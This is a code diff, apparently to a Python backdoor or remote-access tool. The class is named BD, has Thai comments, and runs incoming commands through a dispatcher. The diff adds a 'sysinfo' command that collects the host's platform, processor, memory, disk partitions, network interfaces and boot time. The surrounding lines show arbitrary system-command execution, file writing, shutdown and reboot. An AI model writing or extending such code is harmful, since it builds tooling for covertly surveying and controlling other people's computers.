@@ -11,6 +11,7 @@ import os
 import base64
 import pkg_resources
 import ctypes
+import psutil
 
 
 class BD:
@@ -154,6 +155,40 @@ class BD:
         except Exception as e:
             return f"[-] Write file error: {str(e)}"
         
+    def system_info(self):
+            """รวบรวมข้อมูลระบบ"""
+            try:
+                info = {
+                    'platform': platform.platform(),
+                    'processor': platform.processor(),
+                    'memory': {
+                        'total': psutil.virtual_memory().total,
+                        'available': psutil.virtual_memory().available,
+                        'percent': psutil.virtual_memory().percent
+                    },
+                    'disks': [],
+                    'network': str(psutil.net_if_addrs()),
+                    'boot_time': psutil.boot_time()
+                }
+                
+                # แก้ไขการเข้าถึงข้อมูล disk
+                for partition in psutil.disk_partitions():
+                    try:
+                        partition_usage = psutil.disk_usage(partition.mountpoint)
+                        info['disks'].append({
+                            'device': partition.device,
+                            'mountpoint': partition.mountpoint,
+                            'total': partition_usage.total,
+                            'used': partition_usage.used,
+                            'free': partition_usage.free
+                        })
+                    except:
+                        continue
+                        
+                return str(info)
+            except Exception as e:
+                return f"[-] System info error: {str(e)}"
+        
     def system_shutdown(self):
         try:
             if platform.system().lower() == 'windows':
@@ -227,6 +262,9 @@ class BD:
                 
                 elif cmd[0] == "reboot":
                     cmd_result = self.system_reboot()
+
+                elif cmd[0] == "sysinfo":
+                    cmd_result = self.system_info()
 
                 else:
                     cmd_result = self.execute_sys_cmd(cmd)
